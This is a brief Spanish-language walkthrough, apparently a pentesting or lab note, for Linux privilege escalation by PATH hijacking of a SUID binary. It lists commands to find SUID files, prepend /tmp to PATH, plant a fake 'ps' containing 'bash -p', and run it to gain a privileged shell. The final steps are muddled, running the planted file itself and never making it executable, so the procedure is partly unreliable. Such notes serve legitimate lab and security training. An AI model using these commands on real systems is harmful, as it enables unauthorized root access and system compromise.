**Primero se deben buscar los archivos SUID.**

`$ find / -perm -4000 2>/dev/null`

**Ahora buscar los directorios principales.**

`$ echo $PATH`

**Exportar los directorios principales para envenenar SUID.**

`$ export PATH=/tmp:$PATH`

**Creamos un archivo con el mismo nombre del SUID (ejemplo: nmap, ps, passwd, etc.) en la carpeta /tmp**

`$ touch ps`

**Editamos el archivo ps con el comando a inyectar.**

`$ bash -p`

**Verificamos los cambios del PATH.**

`$ echo $PATH`

**Ejecutamos el script que tiene permisos binarios y escalaremos privilegios.**

`$ ./ps`
